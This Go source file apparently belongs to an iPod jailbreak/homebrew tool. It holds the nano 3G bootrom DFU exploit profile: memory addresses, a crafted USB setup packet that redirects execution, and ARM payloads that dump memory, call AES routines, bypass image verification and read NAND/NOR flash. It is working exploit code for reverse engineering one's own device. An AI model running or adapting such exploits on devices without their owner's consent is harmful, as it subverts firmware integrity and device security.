package exploit

import (
	"fmt"

	"github.com/freemyipod/wInd3x/pkg/uasm"
)

type epNano3G struct{}

func (_ *epNano3G) DFUBufAddr() uint32 {
	return 0x22028220
}

func (_ *epNano3G) ExecAddr() uint32 {
	return 0x220284A8
}

func (_ *epNano3G) USBBufAddr() uint32 {
	return 0x22028A20
}

func (_ *epNano3G) TrampolineAddr() uint16 {
	// No trampoline necessary.
	return 0
}

func (_ *epNano3G) SetupPacket() []byte {
	// b 0x220284a8
	return []byte{0xa0, 0xfe, 0xff, 0xea, 0x06, 0x00, 0x00, 0x00}
}

func (_ *epNano3G) HandlerFooter(addr uint32) []uasm.Statement {
	return []uasm.Statement{
		// Return 0x40 bytes of requested address.
		uasm.Ldr{Dest: uasm.R0, Src: uasm.Constant(addr)},
		uasm.Mov{Dest: uasm.R1, Src: uasm.Immediate(0x40)},
		uasm.Ldr{Dest: uasm.R2, Src: uasm.Constant(0x2000aa40)},
		uasm.Blx{Dest: uasm.R2},

		// Fix up return.
		uasm.Ldr{Dest: uasm.LR, Src: uasm.Constant(0x200048d4)},
		uasm.Bx{Dest: uasm.LR},
	}
}

func (_ *epNano3G) AESCall() []uasm.Statement {
	return makeCall(0x20001f04, 0x22028220, 0x40, 1, 0, 0)
}

func (_ *epNano3G) AESEncryptSha1() []uasm.Statement {
	return makeCall(0x20001f64, 0x22028220, 0x10, 1, 0, 0)
}

func (_ *epNano3G) HaxedDFUPayload() []uasm.Statement {
	return []uasm.Statement{
		// Copy descriptor to g_State->deviceDescriptor.
		uasm.Ldr{Dest: uasm.R0, Src: uasm.Constant(0x2203fff8)},
		uasm.Ldr{Dest: uasm.R0, Src: uasm.Deref(uasm.R0, 0)},

		uasm.Ldr{Dest: uasm.R1, Src: uasm.Constant(379)},
		uasm.Add{Dest: uasm.R0, Src: uasm.R0, Compl: uasm.R1},
		uasm.Ldr{Dest: uasm.R1, Src: uasm.LabelRef("descriptor")},
		uasm.Ldrb{Dest: uasm.R2, Src: uasm.Deref(uasm.R1, 0)},

		uasm.Label("descriptor_copy_loop"),
		uasm.Ldrb{Dest: uasm.R3, Src: uasm.Deref(uasm.R1, 0)},
		uasm.Strb{Src: uasm.R3, Dest: uasm.Deref(uasm.R0, 0)},
		uasm.Add{Dest: uasm.R1, Src: uasm.R1, Compl: uasm.Immediate(1)},
		uasm.Add{Dest: uasm.R0, Src: uasm.R0, Compl: uasm.Immediate(1)},
		uasm.Sub{Dest: uasm.R2, Src: uasm.R2, Compl: uasm.Immediate(1)},
		uasm.Cmp{A: uasm.R2, B: uasm.Immediate(0)},
		uasm.B{Cond: uasm.NE, Dest: uasm.LabelRef("descriptor_copy_loop")},
		uasm.B{Dest: uasm.LabelRef("on_image_hook_skip")},

		uasm.Label("on_image_hook"),

		// Save LR.
		uasm.Sub{Dest: uasm.SP, Src: uasm.SP, Compl: uasm.Immediate(4)},
		uasm.Str{Src: uasm.LR, Dest: uasm.Deref(uasm.SP, 0)},

		// R0 = g_State->dfuBoot->img_addr2 (img1 header)
		uasm.Ldr{Dest: uasm.R4, Src: uasm.Constant(0x2203fff8)},
		uasm.Ldr{Dest: uasm.R1, Src: uasm.Deref(uasm.R4, 0)},
		uasm.Ldr{Dest: uasm.R0, Src: uasm.Deref(uasm.R1, 1848)},
		uasm.Ldr{Dest: uasm.R0, Src: uasm.Deref(uasm.R0, 44)},
		// R1 = R0 + 0x800 (img1 body)
		uasm.Ldr{Dest: uasm.R1, Src: uasm.Constant(0x800)},
		uasm.Add{Dest: uasm.R1, Src: uasm.R1, Compl: uasm.R0},
		// Call DFUBoot::CopyHeaderBody
		uasm.Ldr{Dest: uasm.R2, Src: uasm.Constant(0x20000ac4)},
		uasm.Blx{Dest: uasm.R2},

		// Set g_State->dfu_done = 1.
		uasm.Ldr{Dest: uasm.R0, Src: uasm.Constant(0x2203fff8)},
		uasm.Ldr{Dest: uasm.R0, Src: uasm.Deref(uasm.R0, 0)},
		uasm.Mov{Dest: uasm.R1, Src: uasm.Immediate(1)},
		uasm.Str{Src: uasm.R1, Dest: uasm.Deref(uasm.R0, 44)},

		// Set g_State->img1_version = "1.0"
		uasm.Ldr{Dest: uasm.R1, Src: uasm.Constant(0x302e31)},
		uasm.Str{Src: uasm.R1, Dest: uasm.Deref(uasm.R0, 52)},
		// Set g_State->entrypoint = 0
		uasm.Mov{Dest: uasm.R1, Src: uasm.Immediate(0)},
		uasm.Str{Src: uasm.R1, Dest: uasm.Deref(uasm.R0, 48)},

		// Restore LR.
		uasm.Ldr{Dest: uasm.LR, Src: uasm.Deref(uasm.SP, 0)},
		uasm.Add{Dest: uasm.SP, Src: uasm.SP, Compl: uasm.Immediate(4)},

		// Return 0.
		uasm.Mov{Dest: uasm.R0, Src: uasm.Immediate(0)},
		uasm.Bx{Dest: uasm.LR},

		uasm.Label("on_image_hook_skip"),

		// Copy on_image_hook to some free memory.
		uasm.Ldr{Dest: uasm.R0, Src: uasm.Constant(0x2203d800)},
		uasm.Ldr{Dest: uasm.R1, Src: uasm.LabelRef("on_image_hook")},
		//uasm.Ldr{Dest: uasm.R2, Src: uasm.LabelRef("on_image_hook_skip")},
		// ... also need constant pool.
		//
		// TODO(q3k): add constant pool markers to uasm and unhardcode this
		// mess.
		uasm.Ldr{Dest: uasm.R2, Src: uasm.Constant(0x100)},
		uasm.Label("hook_copy_loop"),
		uasm.Ldrb{Dest: uasm.R3, Src: uasm.Deref(uasm.R1, 0)},
		uasm.Strb{Src: uasm.R3, Dest: uasm.Deref(uasm.R0, 0)},
		uasm.Add{Dest: uasm.R1, Src: uasm.R1, Compl: uasm.Immediate(1)},
		uasm.Add{Dest: uasm.R0, Src: uasm.R0, Compl: uasm.Immediate(1)},
		uasm.Sub{Dest: uasm.R2, Src: uasm.R2, Compl: uasm.Immediate(1)},
		uasm.Cmp{A: uasm.R2, B: uasm.Immediate(0)},
		uasm.B{Cond: uasm.NE, Dest: uasm.LabelRef("hook_copy_loop")},

		// Set g_State->dfuOnImage = 0x2203d800 (hook)
		uasm.Ldr{Dest: uasm.R0, Src: uasm.Constant(0x2203fff8)},
		uasm.Ldr{Dest: uasm.R0, Src: uasm.Deref(uasm.R0, 0)},
		uasm.Ldr{Dest: uasm.R1, Src: uasm.Constant(0x2203d800)},
		//uasm.Ldr{Dest: uasm.R1, Src: uasm.Constant(0x200034f0)},
		uasm.Str{Src: uasm.R1, Dest: uasm.Deref(uasm.R0, 40)},
	}
}

func (_ *epNano3G) DisableICache() []uasm.Statement {
	return makeCall(0x20000418)
}

func (_ *epNano3G) NANDInit(bank uint32) ([]uasm.Statement, error) {
	// The N3G seems to have at least two NAND controller peripherals? We use
	// the first one (arg 0 to calls).

	var res []uasm.Statement
	// Enable clocks 8, 12.
	res = append(res, makeCall(0x2000147c, 8)...)
	res = append(res, makeCall(0x2000147c, 12)...)
	// Configure GPIO
	res = append(res, makeCall(0x20001830, 0)...)
	// Reset nand bank.
	res = append(res, makeCall(0x200096e4, 0, bank)...)
	return res, nil
}

func (_ *epNano3G) NANDReadPage(bank, page, offset uint32) ([]uasm.Statement, uint32) {
	// Call with bogus last argument (needs 12 bytes of data output as extra argument... ECC..?)
	return makeCall(0x20009910, 0, bank, page, 0x22000100, 0x22000000), 0x22000100 + offset
}

func (_ *epNano3G) NORInit(spino uint32) ([]uasm.Statement, error) {
	var clk uint32
	switch spino {
	case 0:
		clk = 0x22
	case 1:
		clk = 0x2b
	case 2:
		clk = 0x2f
	default:
		return nil, fmt.Errorf("unknown spi peripheral number")
	}
	return []uasm.Statement{
		// Configure GPIO for given peripheral.
		uasm.Mov{Dest: uasm.R0, Src: uasm.Immediate(spino)},
		uasm.Ldr{Dest: uasm.LR, Src: uasm.Constant(0x20001924)},
		uasm.Blx{Dest: uasm.LR},

		// Enable clock for given peripheral.
		uasm.Mov{Dest: uasm.R0, Src: uasm.Immediate(clk)},
		uasm.Ldr{Dest: uasm.LR, Src: uasm.Constant(0x2000147c)},
		uasm.Blx{Dest: uasm.LR},
	}, nil
}
func (_ *epNano3G) NORRead(spino, offset uint32) ([]uasm.Statement, uint32) {
	return []uasm.Statement{
		uasm.Mov{Dest: uasm.R0, Src: uasm.Immediate(spino)},
		uasm.Ldr{Dest: uasm.R1, Src: uasm.Constant(0x84)}, // ???? SPCNT?
		uasm.Ldr{Dest: uasm.LR, Src: uasm.Constant(0x20008f90)},
		uasm.Blx{Dest: uasm.LR},

		uasm.Mov{Dest: uasm.R0, Src: uasm.Immediate(spino)},
		uasm.Ldr{Dest: uasm.R1, Src: uasm.Constant(0x80)},
		uasm.Ldr{Dest: uasm.R2, Src: uasm.Constant(0x22020000)},
		uasm.Ldr{Dest: uasm.R3, Src: uasm.Constant(offset)},
		uasm.Ldr{Dest: uasm.LR, Src: uasm.Constant(0x2000906c)},
		uasm.Blx{Dest: uasm.LR},
	}, 0x22020000
}
